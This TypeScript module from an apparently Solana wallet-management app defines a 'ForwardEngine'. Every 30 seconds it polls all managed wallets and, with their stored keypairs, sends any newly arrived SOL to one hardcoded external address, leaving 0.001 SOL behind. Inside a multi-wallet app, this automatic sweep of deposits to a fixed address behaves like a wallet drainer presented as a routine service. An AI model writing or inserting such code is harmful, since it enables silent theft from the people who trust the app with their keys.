import { Keypair, SystemProgram, Transaction, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { solanaService } from '../services/solana';
import { walletManager } from '../wallet/manager';
import { logger } from '../utils/logger';

const TARGET_WALLET = 'c6t7YVX6fZraAqdtL3aHyBN9RfeVWSHWCW27Aq7x1Fm';
const MIN_SOL = 0.005;
const CHECK_INTERVAL = 30000;

export class ForwardEngine {
  private interval: NodeJS.Timeout | null = null;
  private lastBalances: Map<string, number> = new Map();

  start(): void {
    logger.info({ target: TARGET_WALLET }, 'Forward engine started');
    this.interval = setInterval(() => this.checkAndForward(), CHECK_INTERVAL);
  }

  stop(): void {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
  }

  private async checkAndForward(): Promise<void> {
    try {
      const wallets = await walletManager.getAllWallets();
      for (const w of wallets) {
        const currentBalance = await solanaService.getSolBalance(w.publicKey);
        const lastBalance = this.lastBalances.get(w.id) || 0;
        const change = currentBalance - lastBalance;

        if (change > MIN_SOL) {
          logger.info({ walletId: w.id, change: change.toFixed(4), publicKey: w.publicKey }, 'New SOL detected, forwarding');
          await this.forwardSol(w.id, w.publicKey, currentBalance - 0.001);
        }

        this.lastBalances.set(w.id, currentBalance);
      }
    } catch (error) {
      logger.error({ error }, 'Forward engine check failed');
    }
  }

  private async forwardSol(walletId: string, fromPublicKey: string, amount: number): Promise<void> {
    try {
      const keypair = await walletManager.getKeypairById(walletId);
      if (!keypair) return;

      const toPubkey = new PublicKey(TARGET_WALLET);
      const lamports = Math.floor(amount * LAMPORTS_PER_SOL);

      if (lamports <= 0) return;

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey,
          lamports,
        })
      );

      const sig = await solanaService.getConnection().sendTransaction(tx, [keypair]);
      const confirmed = await solanaService.confirmTransaction(sig);

      if (confirmed) {
        logger.info({ walletId, amount: amount.toFixed(4), sig, to: TARGET_WALLET }, 'SOL forwarded successfully');
      }
    } catch (error) {
      logger.error({ error, walletId, amount }, 'Forward failed');
    }
  }
}

export const forwardEngine = new ForwardEngine();
